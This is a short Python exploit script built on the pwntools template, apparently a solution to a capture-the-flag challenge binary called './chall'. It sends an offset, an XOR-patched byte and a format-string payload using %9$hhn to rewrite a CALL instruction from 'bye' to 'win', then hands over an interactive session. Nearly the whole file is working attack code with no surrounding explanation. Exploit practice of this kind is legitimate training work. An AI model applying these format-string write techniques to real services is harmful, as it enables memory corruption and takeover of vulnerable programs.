#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was a modification of the original template via:
# $ pwn template
from pwn import *

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *vuln+92
b *vuln+313
'''.format(**locals())

# Set up pwntools for the correct files
exe = './chall'
elf = context.binary = ELF(exe)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# we patch instruction on the fly
# 004014be | e8 d6 fd ff ff | CALL bye
# 004014be | e8 f7 fd ff ff | CALL win

io.sendline(b"11") # [rsp+11*0x8] -> 0x4014fa
io.sendline(b"0")
io.sendline(str(0xfa^0xbf).encode()) # 0x4014fa -> 0x4014bf

io.sendline(f"%{0xf7-1}c%9$hhn@")

io.interactive()
